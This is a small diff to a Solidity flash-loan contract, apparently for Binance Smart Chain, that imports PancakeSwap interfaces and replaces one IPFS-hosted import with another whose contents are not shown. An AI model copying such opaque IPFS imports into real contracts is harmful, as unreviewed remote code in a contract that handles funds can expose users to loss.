@@ -8,7 +8,7 @@ import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contra
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
-import "ipfs://QmQJ4ZgYMSXx5PWYWN17qSYnYYtsi9V4wR2jrxtGD6wxf2";
+import "ipfs://QmeBpsN1PJYjt1ifL1jQRSpwqpeY28NABcY4SVZXTq6LN6";
 
 /**
  * WARNING - this contract code is for Binance Smart Chain not Ethereum network
